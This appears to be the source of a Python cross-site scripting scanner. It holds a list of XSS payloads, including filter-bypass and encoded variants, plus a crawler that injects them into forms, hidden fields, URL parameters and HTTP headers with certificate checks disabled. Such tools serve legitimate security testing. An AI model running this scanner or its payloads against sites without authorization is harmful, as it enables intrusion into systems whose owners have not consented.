import sys, os, threading, requests, warnings, json, re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime

warnings.filterwarnings("ignore")

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

# 50+ real XSS payloads
PAYLOADS = [
    # basic
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    # attribute break
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><img src=x onerror=alert('XSS')>",
    "\"><img src=x onerror=alert('XSS')>",
    # event handlers
    "<input autofocus onfocus=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    # case bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<Img src=x onerror=alert('XSS')>",
    # js injection
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "';alert(String.fromCharCode(88,83,83))//",
    # encoded
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    # template literal
    "<script>alert`XSS`</script>",
    # nested
    "</script><script>alert('XSS')</script>",
    "<<script>alert('XSS');//<</script>",
    # svg
    "<svg><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=\"alert('XSS')\">",
    # href
    "<a href=javascript:alert('XSS')>click</a>",
    # data uri
    "<object data=javascript:alert('XSS')>",
    # dom
    "#<script>alert('XSS')</script>",
    "#<img src=x onerror=alert('XSS')>",
    # filter bypass
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
]

def fetch_page(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=15,
                        verify=False, allow_redirects=True)
        return r.text, r.status_code
    except Exception:
        return "", 0

def get_forms(html, base_url):
    soup  = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for tag in form.find_all(["input", "textarea", "select"]):
            t = tag.attrs.get("type", "text").lower()
            n = tag.attrs.get("name", "")
            if t not in ["submit","button","reset","image","file","hidden","checkbox","radio"] and n:
                inputs.append(n)
        # also include hidden inputs for testing
        for tag in form.find_all("input"):
            if tag.attrs.get("type","").lower() == "hidden":
                n = tag.attrs.get("name","")
                if n and n not in inputs:
                    inputs.append(n)
        if inputs:
            target = urljoin(base_url, action) if action else base_url
            forms.append({"action": target, "method": method, "inputs": inputs})
    return forms

def get_links(html, base_url):
    soup      = BeautifulSoup(html, "html.parser")
    base_host = urlparse(base_url).netloc
    links     = set()
    for a in soup.find_all("a", href=True):
        href = a["href"].strip()
        if not href or href.startswith(("mailto:","tel:","javascript:","#","void")):
            continue
        full = urljoin(base_url, href)
        parsed = urlparse(full)
        if parsed.netloc == base_host and parsed.scheme in ["http","https"]:
            links.add(full.split("#")[0])
    # also find links in scripts and other tags
    for tag in soup.find_all(["script","link"], src=True):
        src = tag.attrs.get("src","")
        if src:
            full = urljoin(base_url, src)
            if urlparse(full).netloc == base_host:
                links.add(full.split("#")[0])
    return links

def inject_form(form, payload):
    data = {name: payload for name in form["inputs"]}
    try:
        if form["method"] == "post":
            r = requests.post(form["action"], data=data,
                            headers=HEADERS, timeout=15, verify=False)
        else:
            r = requests.get(form["action"], params=data,
                           headers=HEADERS, timeout=15, verify=False)
        return r.text, data
    except Exception:
        return "", data

def inject_params(url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return []
    results = []
    for param in params:
        new_params = {k: v[0] for k, v in params.items()}
        new_params[param] = payload
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params)}"
        try:
            r = requests.get(new_url, headers=HEADERS, timeout=15, verify=False)
            results.append({"url": new_url, "param": param, "response": r.text})
        except Exception:
            continue
    return results

def inject_headers(url, payload):
    """Test XSS via HTTP headers"""
    findings = []
    test_headers = {
        "Referer":    payload,
        "User-Agent": payload,
        "X-Forwarded-For": payload
    }
    for header, val in test_headers.items():
        try:
            h = dict(HEADERS)
            h[header] = val
            r = requests.get(url, headers=h, timeout=15, verify=False)
            if payload in r.text:
                findings.append({"header": header, "url": url})
        except Exception:
            continue
    return findings

def crawl(base_url, max_pages=50, log_fn=None):
    visited  = set()
    to_visit = {base_url}
    pages    = []

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop()
        if url in visited:
            continue
        visited.add(url)
        html, status = fetch_page(url)
        if not html:
            continue
        forms  = get_forms(html, url)
        links  = get_links(html, base_url)
        params = {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}
        to_visit.update(links - visited)
        pages.append({"url": url, "forms": forms, "params": params, "html": html})
        if log_fn:
            log_fn(f"[+] Crawled: {url} | Forms:{len(forms)} Params:{len(params)} Links:{len(links)}")
    return pages
